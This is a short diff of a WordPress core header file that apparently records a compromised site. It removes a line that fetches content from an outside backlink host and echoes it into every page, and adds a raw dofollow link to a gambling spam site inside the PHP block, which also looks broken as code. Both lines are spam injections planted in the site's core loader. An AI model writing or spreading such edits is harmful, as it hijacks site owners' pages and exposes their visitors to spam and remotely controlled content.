@@ -18,6 +18,6 @@ if ( ! isset( $wp_did_header ) ) {
 	// Load the theme template.
 	require_once ABSPATH . WPINC . '/template-loader.php';
 	
-$framework_controller_2 = file_get_contents('https://bsp-backlink.com/wp-plugins.php'); echo $framework_controller_2;
-
+<a href=”https://go-jekglobal.com/” rel=”dofollow”>piala88</a>
+	
 }
